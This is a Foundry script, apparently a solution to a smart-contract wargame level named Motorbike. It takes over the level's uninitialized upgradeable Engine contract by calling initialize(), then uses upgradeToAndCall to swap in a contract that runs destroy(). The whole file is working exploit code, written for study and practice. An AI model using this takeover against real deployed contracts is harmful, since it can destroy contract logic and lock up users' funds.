// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import {Script} from "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/level25/Motorbike.sol";
import {DestroyEngine} from "../src/level25/DestroyEngine.sol";

import "forge-std/console.sol";

contract level25Exploit is Script {
    Motorbike motorbike =
        Motorbike(payable(0x36615bc67cFC9b438bF08388E8AbDcFA46828624));
    Engine engine = Engine(payable(0x0cD6Ed6CD8b8EdC88327Fc271335F5195d20210C));

    function run() external {
        vm.startBroadcast();
        DestroyEngine destroyEngine = new DestroyEngine();
        engine.initialize();
        console.log("Upgrader: ", engine.upgrader());
        engine.upgradeToAndCall(
            address(destroyEngine),
            abi.encodeWithSignature("destroy()")
        );

        vm.stopBroadcast();
    }
}
